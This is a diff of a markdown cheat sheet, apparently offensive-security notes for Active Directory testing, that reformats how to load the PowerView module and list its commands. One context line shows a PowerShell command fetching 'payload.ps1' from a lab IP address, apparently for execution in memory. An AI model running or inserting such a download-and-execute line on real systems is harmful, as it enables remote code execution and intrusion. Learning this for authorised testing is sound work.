@@ -3,9 +3,15 @@
 # PowerShell
 Load a script and module (local)
 ```
-. C:\AD\Tools\PowerView.ps1  OR  Import-Module C:\AD\Tools\PowerView.ps1
-Get-Command -Module <modulename>   (list all the commands u can use in particular module)
+. C:\AD\Tools\PowerView.ps1
+OR
+Import-Module C:\AD\Tools\PowerView.ps1
 ```
+list all the commands u can use in a particular module
+```
+Get-Command -Module <modulename>
+```
+
 - Load a script and module (remotely)
 -     ine (New-Object Net.WebClient).DownloadString('http://10.10.16.10/payload.ps1')
 
